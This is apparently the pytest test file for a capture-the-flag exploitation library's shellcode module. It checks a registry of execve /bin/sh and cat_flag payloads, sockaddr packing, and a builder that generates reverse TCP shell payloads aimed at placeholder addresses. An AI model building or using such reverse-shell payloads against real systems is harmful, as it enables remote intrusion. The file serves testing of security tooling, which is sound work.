# tests/test_shellcode.py
import ipaddress
import pytest

from pwnkit.shellcode import (
    SHELLCODES,
    ShellcodeReigstry,   # spelling per module
    hex_shellcode,
    build_sockaddr_in,
    list_shellcodes,
    Shellcode,
    ShellcodeBuilder,
)

# ---------------------------
# hex_shellcode
# ---------------------------
def test_hex_shellcode_bytes_and_str():
    assert hex_shellcode(b"\x90\x90\xcc") == r"\x90\x90\xcc"
    assert hex_shellcode("ABC") == r"\x41\x42\x43"


# ---------------------------
# build_sockaddr_in
# ---------------------------
def test_build_sockaddr_in_loopback_4444():
    buf = build_sockaddr_in("127.0.0.1", 4444)  # 0x115c
    assert isinstance(buf, (bytes, bytearray))
    assert len(buf) == 16
    assert buf[0:2] == b"\x02\x00"                               # AF_INET LE
    assert buf[2:4] == (4444).to_bytes(2, "big")                 # port BE
    assert buf[4:8] == ipaddress.IPv4Address("127.0.0.1").packed # IP BE
    assert buf[8:] == b"\x00" * 8                                # padding


# ---------------------------
# list_shellcodes inventory
# ---------------------------
def test_list_shellcodes_has_known_entries():
    items = list(list_shellcodes())
    assert any(s.startswith("amd64:execve_bin_sh:") for s in items)
    assert "amd64:cat_flag" in items
    assert any(s.startswith("i386:execve_bin_sh:") for s in items)


# ---------------------------
# ShellcodeReigstry.get — families & singletons
# ---------------------------
def test_get_family_default_min_variant_amd64():
    sc = ShellcodeReigstry.get("amd64", "execve_bin_sh")
    assert isinstance(sc, Shellcode)
    assert sc.arch == "amd64"
    assert sc.name.endswith(":27")  # min by default
    assert sc.blob == SHELLCODES["amd64"]["execve_bin_sh"][27]

def test_get_family_explicit_variant_i386():
    sc = ShellcodeReigstry.get("i386", "execve_bin_sh", variant=33)
    assert sc.arch == "i386"
    assert sc.name.endswith(":33")
    assert sc.blob == SHELLCODES["i386"]["execve_bin_sh"][33]

def test_get_singleton_cat_flag():
    sc = ShellcodeReigstry.get("amd64", "cat_flag")
    assert sc.arch == "amd64"
    assert sc.name == "cat_flag"
    assert sc.blob == SHELLCODES["amd64"]["cat_flag"]


# ---------------------------
# ShellcodeReigstry.get — composite keys & fuzzy
# ---------------------------
def test_get_composite_key_arch_in_key_with_variant():
    sc = ShellcodeReigstry.get(None, "amd64:execveat_bin_sh:29")
    assert sc.arch == "amd64"
    assert sc.name.endswith(":29")
    assert sc.blob == SHELLCODES["amd64"]["execveat_bin_sh"][29]

def test_get_composite_key_arch_in_key_default_variant():
    sc = ShellcodeReigstry.get(None, "i386:execve_bin_sh")
    assert sc.arch == "i386"
    assert sc.name.endswith(":21")
    assert sc.blob == SHELLCODES["i386"]["execve_bin_sh"][21]

def test_fuzzy_single_hit_ls_current_dir():
    sc = ShellcodeReigstry.get("amd64", "ls_")
    assert sc.name == "ls_current_dir"
    assert sc.blob == SHELLCODES["amd64"]["ls_current_dir"]


# ---------------------------
# ShellcodeReigstry.get — errors
# ---------------------------
def test_error_unknown_arch():
    with pytest.raises(KeyError) as ei:
        ShellcodeReigstry.get("mips", "execve_bin_sh")
    assert "Unknown arch" in str(ei.value)

def test_error_missing_name_lists_available():
    with pytest.raises(KeyError) as ei:
        ShellcodeReigstry.get("amd64", "does_not_exist")
    msg = str(ei.value)
    assert "No payload named" in msg and "Available:" in msg

def test_error_bad_variant():
    with pytest.raises(KeyError) as ei:
        ShellcodeReigstry.get("i386", "execve_bin_sh", variant=9999)
    assert "Variant 9999 not found" in str(ei.value)

def test_error_arch_none_without_prefix():
    with pytest.raises(ValueError) as ei:
        ShellcodeReigstry.get(None, "execve_bin_sh")
    assert "key lacks arch prefix" in str(ei.value)


# ---------------------------
# ShellcodeBuilder — amd64
# ---------------------------
def test_shellcode_builder_reverse_tcp_connect_contains_ip_port_amd64():
    b = ShellcodeBuilder("amd64").build_reverse_tcp_connect("10.11.12.13", 31337)
    ip_be = ipaddress.IPv4Address("10.11.12.13").packed
    port_be = (31337).to_bytes(2, "big")
    assert port_be + ip_be in b

def test_shellcode_builder_reverse_tcp_shell_contains_ip_port_amd64():
    b = ShellcodeBuilder("amd64").build_reverse_tcp_shell("192.0.2.7", 4444)
    ip_be = ipaddress.IPv4Address("192.0.2.7").packed
    port_be = (4444).to_bytes(2, "big")
    assert port_be + ip_be in b
    assert b"/bin/sh\x00" in b

def test_shellcode_builder_alpha_seed_prefix_amd64():
    b = ShellcodeBuilder("amd64").build_alpha_shellcode("rbx")
    assert isinstance(b, (bytes, bytearray))
    assert b.startswith(b"S")  # 'rbx' → 'S'

def test_shellcode_builder_alpha_unsupported_arch():
    with pytest.raises(NotImplementedError):
        ShellcodeBuilder("arm").build_alpha_shellcode("rdi")


# ---------------------------
# ShellcodeBuilder — i386 reverse tcp shell
# ---------------------------
def test_shellcode_builder_reverse_tcp_shell_contains_ip_port_i386():
    b = ShellcodeBuilder("i386").build_reverse_tcp_shell("203.0.113.5", 1337)
    ip_be = ipaddress.IPv4Address("203.0.113.5").packed
    port_be = (1337).to_bytes(2, "big")
    assert ip_be in b
    assert port_be in b

